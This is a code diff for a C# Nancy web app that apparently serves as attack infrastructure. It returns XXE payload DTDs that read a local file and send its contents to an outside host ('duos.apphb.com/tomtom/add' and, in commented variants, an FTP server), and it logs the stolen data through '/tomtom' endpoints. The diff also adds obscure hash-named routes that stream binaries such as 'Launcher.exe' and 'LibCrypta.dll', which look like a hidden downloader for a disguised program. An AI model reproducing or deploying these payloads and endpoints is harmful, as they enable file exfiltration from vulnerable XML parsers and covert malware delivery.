@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
+using System.IO;
 using System.Web.Routing;
 using Nancy;
 
@@ -21,7 +22,7 @@ namespace DuosWeb
             {
                 return Response.AsText(getRaw());
             };
-
+            
             Get["/tomtom/add"] = _ =>
             {
                 Data.Add(new RequestEntry()
@@ -59,11 +60,13 @@ namespace DuosWeb
                     Date = DateTime.Now,
                     Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                 });
+
+                return Response.AsText(System.IO.File.ReadAllText("C:\\e.dtd"));
                 return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?text=%file;'>\">%all;");
                 //return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://demo:password@test.rebex.net/text=%file;'>\">%all;");
                 //return Response.AsText("<!ENTITY % payload SYSTEM \"" + path + "\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://duos.apphb.com/tomtom/add?text=%payload;'>\"> %int; %trick;");
             };
-
+            
             Get["/tomtom/{any*}"] = _ =>
             {
                 Data.Add(new RequestEntry()
@@ -72,6 +75,44 @@ namespace DuosWeb
                     Info = getRaw()
                 });
                 return "<!-- added -->";
+            };
+
+            Get["/b3433905ae609b25a44c96de506689bc"] = _ =>
+            {
+                return "NUnrar.dll:LibCrypta.dll:Launcher.exe";
+            };
+            Get["/b3433905ae609b25a44c96de506689bc{id}"] = _ =>
+            {
+                int id = _.id;
+                byte[] data;
+                MemoryStream ms;
+                switch (id)
+                {
+                    case 1:
+                        data = Properties.Resources.NUnrar;
+                        ms = new MemoryStream(data);
+                        return Response.FromStream(ms, "application/octet-stream");
+                    case 2:
+                        data = Properties.Resources.LibCrypta;
+                        ms = new MemoryStream(data);
+                        return Response.FromStream(ms, "application/octet-stream");
+                    case 4:
+                        data = Properties.Resources.Launcher;
+                        ms = new MemoryStream(data);
+                        return Response.FromStream(ms, "application/octet-stream");
+                    default:
+                        return string.Empty;
+                }
+            };
+            Get["/fdd6e0e1461590d5d12cee056fcde3c9"] = _ =>
+            {
+                byte[] data = Properties.Resources.items2;
+                MemoryStream ms = new MemoryStream(data);
+                return Response.FromStream(ms, "application/octet-stream");
+            };
+            Get["/fdd6e0e1461590d5d12cee056fcde3c9q"] = _ =>
+            {
+                return "Debug\\VkMusicWPF.exe";
             };
         }
 
